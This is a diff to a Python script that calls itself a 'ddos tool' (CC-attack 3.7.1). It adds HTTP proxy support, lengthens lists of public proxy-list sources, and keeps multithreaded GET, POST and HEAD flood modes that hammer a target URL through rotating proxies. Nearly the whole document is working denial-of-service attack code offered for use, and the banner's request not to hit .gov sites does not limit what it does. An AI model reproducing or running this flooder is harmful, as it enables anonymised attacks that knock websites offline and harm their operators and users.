@@ -25,16 +25,15 @@ print ('''
 	 CC/////  CC/////   | ddos tool |/ 
 	  CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Version 3.7 (2022/3/22)
-							C0d3d by L330n123
+Version 3.7.1 (2022/3/24)
+                              C0d3d by L330n123
 ┌─────────────────────────────────────────────┐
 │        Tos: Don't attack .gov website       │
 ├─────────────────────────────────────────────┤
 │                 New stuff:                  │
-│          [+] Changed Input Method           │
-│          [+] Changed Output                 │
+│          [+] Added Http Proxy Support       │
 │          [+] Optimization                   │
-│          [-] Removed Slow Attack            │
+│          [+] Changed Varible Name           │
 ├─────────────────────────────────────────────┤
 │ Link: https://github.com/Leeon123/CC-attack │
 └─────────────────────────────────────────────┘''')
@@ -86,9 +85,9 @@ referers = [
 ######### Default value ########
 mode = "cc"
 url = ""
-socks_ver = "5"
+proxy_ver = "5"
 brute = False
-out_file = "socks.txt"
+out_file = "proxy.txt"
 thread_num = 800
 data = ""
 cookies = ""
@@ -98,20 +97,20 @@ strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
 Intn = random.randint
 Choice = random.choice
 ###################################################
-def build_threads(mode,thread_num,event,socks_type):
+def build_threads(mode,thread_num,event,proxy_type):
 	if mode == "post":
 		for _ in range(thread_num):
-			th = threading.Thread(target = post,args=(event,socks_type,))
+			th = threading.Thread(target = post,args=(event,proxy_type,))
 			th.daemon = True
 			th.start()
 	elif mode == "cc":
 		for _ in range(thread_num):
-			th = threading.Thread(target = cc,args=(event,socks_type,))
+			th = threading.Thread(target = cc,args=(event,proxy_type,))
 			th.daemon = True
 			th.start()
 	elif mode == "head":
 		for _ in range(thread_num):
-			th = threading.Thread(target = head,args=(event,socks_type,))
+			th = threading.Thread(target = head,args=(event,proxy_type,))
 			th.daemon = True
 			th.start()
 			
@@ -230,7 +229,7 @@ def InputOption(question,options,default):
 			continue
 	return ans
 
-def cc(event,socks_type):
+def cc(event,proxy_type):
 	header = GenReqHeader("get")
 	proxy = Choice(proxies).strip().split(":")
 	add = "?"
@@ -240,10 +239,12 @@ def cc(event,socks_type):
 	while True:
 		try:
 			s = socks.socksocket()
-			if socks_type == 4:
+			if proxy_type == 4:
 				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if socks_type == 5:
+			if proxy_type == 5:
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+			if proxy_type == 0:
+				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.settimeout(3)
@@ -266,7 +267,7 @@ def cc(event,socks_type):
 		except:
 			s.close()
 
-def head(event,socks_type):#HEAD MODE
+def head(event,proxy_type):#HEAD MODE
 	header = GenReqHeader("head")
 	proxy = Choice(proxies).strip().split(":")
 	add = "?"
@@ -276,10 +277,12 @@ def head(event,socks_type):#HEAD MODE
 	while True:
 		try:
 			s = socks.socksocket()
-			if socks_type == 4:
+			if proxy_type == 4:
 				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if socks_type == 5:
+			if proxy_type == 5:
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+			if proxy_type == 0:
+				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(target), int(port)))
@@ -300,17 +303,19 @@ def head(event,socks_type):#HEAD MODE
 		except:#dirty fix
 			s.close()
 
-def post(event,socks_type):
+def post(event,proxy_type):
 	request = GenReqHeader("post")
 	proxy = Choice(proxies).strip().split(":")
 	event.wait()
 	while True:
 		try:
 			s = socks.socksocket()
-			if socks_type == 4:
+			if proxy_type == 4:
 				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if socks_type == 5:
+			if proxy_type == 5:
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+			if proxy_type == 0:
+				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(target), int(port)))
@@ -329,16 +334,18 @@ def post(event,socks_type):
 		except:
 			s.close()
 ''' idk why it's not working, so i temporarily removed it
-def slow_atk_conn(socks_type,rlock):
+def slow_atk_conn(proxy_type,rlock):
 	global socket_list
 	proxy = Choice(proxies).strip().split(":")
 	while 1:
 		try:
 			s = socks.socksocket()
-			if socks_type == 4:
+			if proxy_type == 4:
 				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if socks_type == 5:
+			if proxy_type == 5:
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+if proxy_type == 0:
+				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
 			s.settimeout(3)
 			s.connect((str(target), int(port)))
 			if str(port) == '443':
@@ -360,11 +367,11 @@ def slow_atk_conn(socks_type,rlock):
 			proxy = Choice(proxies).strip().split(":")#Only change proxy when error, increase the performance
 
 socket_list=[]
-def slow(conn,socks_type):
+def slow(conn,proxy_type):
 	global socket_list
 	rlock = threading.Lock
 	for _ in range(conn):
-		threading.Thread(target=slow_atk_conn,args=(socks_type,rlock,),daemon=True).start()
+		threading.Thread(target=slow_atk_conn,args=(proxy_type,rlock,),daemon=True).start()
 	while True:
 		sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 		sys.stdout.flush()
@@ -381,13 +388,13 @@ def slow(conn,socks_type):
 					sys.stdout.flush()
 			proxy = Choice(proxies).strip().split(":")
 			for _ in range(conn - len(socket_list)):
-				threading.Thread(target=slow_atk_conn,args=(socks_type,rlock,),daemon=True).start()
+				threading.Thread(target=slow_atk_conn,args=(proxy_type,rlock,),daemon=True).start()
 		else:
 			time.sleep(0.1)
 '''		
 		
 nums = 0
-def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by Leeon123
+def checking(lines,proxy_type,ms,rlock,):#Proxy checker coded by Leeon123
 	global nums
 	global proxies
 	proxy = lines.strip().split(":")
@@ -405,10 +412,12 @@ def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by Leeon123
 			break
 		try:
 			s = socks.socksocket()
-			if socks_type == 4:
+			if proxy_type == 4:
 				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if socks_type == 5:
+			if proxy_type == 5:
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+			if proxy_type == 0:
+				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
 			s.settimeout(ms)
 			s.connect(("1.1.1.1", 80))
 			'''
@@ -429,11 +438,14 @@ def check_socks(ms):#Coded by Leeon123
 	thread_list=[]
 	rlock = threading.RLock()
 	for lines in list(proxies):
-		if socks_ver == "5":
+		if proxy_ver == "5":
 			th = threading.Thread(target=checking,args=(lines,5,ms,rlock,))
 			th.start()
-		if socks_ver == "4":
+		if proxy_ver == "4":
 			th = threading.Thread(target=checking,args=(lines,4,ms,rlock,))
+			th.start()
+		if proxy_ver == "http":
+			th = threading.Thread(target=checking,args=(lines,0,ms,rlock,))
 			th.start()
 		thread_list.append(th)
 		time.sleep(0.01)
@@ -458,37 +470,38 @@ def check_list(socks_file):
 	temp_list = []
 	for i in temp:
 		if i not in temp_list:
-			if ':' in i:
-				temp_list.append(i)
+			if ':' in i and '#' not in i:
+				try:
+					socket.inet_pton(socket.AF_INET,i.strip().split(":")[0])#check valid ip v4
+					temp_list.append(i)
+				except:
+					pass
 	rfile = open(socks_file, "wb")
 	for i in list(temp_list):
 		rfile.write(bytes(i,encoding='utf-8'))
 	rfile.close()
 
-def downloadsocks(socks_ver):
-	if socks_ver == "4":
+def DownloadProxies(proxy_ver):
+	if proxy_ver == "4":
 		f = open(out_file,'wb')
-		try:
-			r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",timeout=5)
-			f.write(r.content)
-		except:
-			pass
-		try:
-			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4",timeout=5)
-			f.write(r.content)
-		except:
-			pass
-		try:
-			r = requests.get("https://www.proxyscan.io/download?type=socks4",timeout=5)
-			f.write(r.content)
-		except:
-			pass
-		try:
-			r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",timeout=5)
-			f.write(r.content)
-			f.close()
-		except:
-			f.close()
+		socks4_api = [
+			"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
+			"https://www.proxy-list.download/api/v1/get?type=socks4",
+			"https://www.proxyscan.io/download?type=socks4",
+			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
+			'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt',
+			"https://api.openproxylist.xyz/socks4.txt",
+			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
+			"https://www.freeproxychecker.com/result/socks4_proxies.txt",
+			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
+		]
+		for api in socks4_api:
+			try:
+				r = requests.get(api,timeout=5)
+				f.write(r.content)
+			except:
+				pass
+		f.close()
 		try:#credit to All3xJ
 			r = requests.get("https://www.socks-proxy.net/",timeout=5)
 			part = str(r.content)
@@ -507,34 +520,58 @@ def downloadsocks(socks_ver):
 				fd.close()
 		except:
 			pass
-	if socks_ver == "5":
+	if proxy_ver == "5":
 		f = open(out_file,'wb')
-		try:
-			r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",timeout=5)
-			f.write(r.content)
-		except:
-			pass
-		try:
-			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5",timeout=5)
-			f.write(r.content)
-		except:
-			pass
-		try:
-			r = requests.get("https://www.proxyscan.io/download?type=socks5",timeout=5)
-			f.write(r.content)
-		except:
-			pass
-		try:
-			r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",timeout=5)
-			f.write(r.content)
-		except:
-			pass
-		try:
-			r = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",timeout=5)
-			f.write(r.content)
-			f.close()
-		except:
-			f.close()
+		socks5_api = [
+			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
+			"https://www.proxy-list.download/api/v1/get?type=socks5",
+			"https://www.proxyscan.io/download?type=socks5",
+			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+			"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
+			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
+			"https://api.openproxylist.xyz/socks5.txt",
+			"https://www.freeproxychecker.com/result/socks5_proxies.txt",
+			#"http://www.socks24.org/feeds/posts/default"
+		]
+		for api in socks5_api:
+			try:
+				r = requests.get(api,timeout=5)
+				f.write(r.content)
+			except:
+				pass
+		f.close()
+	if proxy_ver == "http":
+		f = open(out_file,'wb')
+		http_api = [
+			"https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
+			"https://www.proxy-list.download/api/v1/get?type=http",
+			"https://www.proxyscan.io/download?type=http",
+			#"http://spys.me/proxy.txt",
+			"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
+			"https://api.openproxylist.xyz/http.txt",
+			"https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
+			"http://alexa.lr2b.com/proxylist.txt",
+			"http://rootjazz.com/proxies/proxies.txt",
+			"https://www.freeproxychecker.com/result/http_proxies.txt",
+			"http://proxysearcher.sourceforge.net/Proxy%20List.php?type=http",
+			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
+			"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+			"https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
+			"https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt"
+			"https://proxy-spider.com/api/proxies.example.txt",
+			"https://multiproxy.org/txt_all/proxy.txt",
+			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
+			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
+			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
+		]
+		for api in http_api:
+			try:
+				r = requests.get(api,timeout=5)
+				f.write(r.content)
+			except:
+				pass
+		f.close()
 	print("> Have already downloaded proxies list as "+out_file)
 
 def PrintHelp():
@@ -545,7 +582,7 @@ def PrintHelp():
    -data     | set post data path (only works on post mode)
              | (Example: -data data.json)
    -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
-   -v        | set socks version (4/5, default:5)
+   -v        | set proxy type (4/5/http, default:5)
    -t        | set threads number (default:400)
    -f        | set proxies file (default:socks.txt)
    -b        | enable/disable brute mode
@@ -557,7 +594,7 @@ def PrintHelp():
 
 
 def main():
-	global socks_ver
+	global proxy_ver
 	global data
 	global cookies
 	global brute
@@ -570,12 +607,13 @@ def main():
 	target = ""
 	check_proxies = False
 	download_socks = False
-	socks_type = 5
+	proxy_type = 5
 	period = 60
+	help = False
 	print("> Mode: [cc/post/head]")#slow]")
 	for n,args in enumerate(sys.argv):
 		if args == "-help" or args =="-h":
-			PrintHelp()
+			help =True
 		if args=="-url":
 			ParseUrl(sys.argv[n+1])
 		if args=="-m" or args=="-mode":
@@ -584,13 +622,15 @@ def main():
 				print("> -m/-mode argument error")
 				return
 		if args =="-v":
-			socks_ver = sys.argv[n+1]
-			if socks_ver == "4":
-				socks_type = 4
-			elif socks_ver == "5":
-				socks_type = 5
-			elif socks_ver not in ["4","5"]:
-				print("> -v argument error (only 4/5)")
+			proxy_ver = sys.argv[n+1]
+			if proxy_ver == "4":
+				proxy_type = 4
+			elif proxy_ver == "5":
+				proxy_type = 5
+			elif proxy_ver == "http":
+				proxy_type = 0
+			elif proxy_ver not in ["4","5","http"]:
+				print("> -v argument error (only 4/5/http)")
 				return
 		if args == "-b":
 			if sys.argv[n+1] == "1":
@@ -625,7 +665,7 @@ def main():
 				return
 
 	if download_socks:
-		downloadsocks(socks_ver)
+		DownloadProxies(proxy_ver)
 
 	if os.path.exists(out_file)!=True:
 		print("Proxies file not found")
@@ -641,22 +681,26 @@ def main():
 		check_socks(3)
 
 	proxies = open(out_file).readlines()
+	
+	if help:
+		PrintHelp()
 
 	if target == "":
 		print("> There is no target. End of process ")
 		return
+	'''
 	if mode == "slow":
-		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
+		th = threading.Thread(target=slow,args=(thread_num,proxy_type,))
 		th.daemon = True
 		th.start()
-	else:
-		event = threading.Event()
-		print("> Building threads...")
-		build_threads(mode,thread_num,event,socks_type)
-		event.clear()
-		#input("Press Enter to continue.")
-		event.set()
-		print("> Flooding...")
+	else:'''
+	event = threading.Event()
+	print("> Building threads...")
+	build_threads(mode,thread_num,event,proxy_type)
+	event.clear()
+	#input("Press Enter to continue.")
+	event.set()
+	print("> Flooding...")
 	time.sleep(period)
 
 if __name__ == "__main__":
